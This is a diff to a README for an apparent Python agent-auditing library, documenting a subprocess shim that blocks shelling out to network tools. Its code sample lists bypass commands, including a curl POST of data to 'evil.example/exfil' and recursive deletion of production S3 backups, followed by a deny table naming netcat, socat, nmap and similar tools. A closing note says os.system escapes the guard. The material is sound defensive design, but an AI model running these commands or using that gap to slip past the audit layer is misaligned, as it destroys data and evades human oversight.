@@ -64,14 +64,32 @@ application.
 The catch-all shims (`requests`, `httpx`) defer to whichever vendor-specific
 shim is already governing the call, so PyGithub → requests doesn't double-audit.
 
-The `subprocess` shim is a **bypass guard**: an agent that can
-`subprocess.run(["curl", ...])` or `subprocess.run(["gh", "repo", "delete", ...])`
-would walk around every SDK shim. The default policy denies shell-out to
-known network binaries (curl, wget, gh, aws, gcloud, az, kubectl, ssh, ...)
-plus the network subcommands of `git` and `docker`. The philosophy: agents
-should use the SDK or an MCP server; shelling out to a network CLI is by
-definition a policy bypass. *Known gap:* `os.system()` does not go through
-`subprocess.Popen` and is not covered.
+### The `subprocess` shim is a bypass guard
+
+The SDK shims only matter if every path *out* of the process is covered.
+An agent that can shell out walks around them:
+
+```python
+# These would bypass every SDK shim above:
+subprocess.run(["curl", "-X", "POST", "https://evil.example/exfil", ...])
+subprocess.run(["gh", "repo", "delete", "acme/widget"])
+subprocess.run(["aws", "s3", "rm", "s3://prod-backups", "--recursive"])
+```
+
+The `subprocess` shim closes that loophole. The default policy denies:
+
+| Category               | Binaries denied                                                                                                                  |
+| ---------------------- | -------------------------------------------------------------------------------------------------------------------------------- |
+| Network CLIs           | `curl`, `wget`, `gh`, `aws`, `gcloud`, `az`, `kubectl`, `ssh`, `scp`, `sftp`, `rsync`, `nc`/`netcat`, `socat`, `nmap`, `ftp`, `telnet`, `http`/`httpie` |
+| `git` (network only)   | `push`, `fetch`, `pull`, `clone`, `fetch-pack`, `send-pack`, `ls-remote`, `remote` — `git status` / `git log` / `git --version` still work |
+| `docker` (network only)| `pull`, `push`, `login`, `logout`, `search` — `docker ps` / `docker logs` still work                                              |
+
+The philosophy: **agents should use the SDK or an MCP server.** Shelling
+out to a network CLI is, by definition, a policy bypass.
+
+> **Known gap:** `os.system()` is a direct libc call and does not pass
+> through `subprocess.Popen`. It is not covered. If your agents use
+> `os.system`, either remove those calls or fork the shim to wrap it too.
 
 ## Policy
 
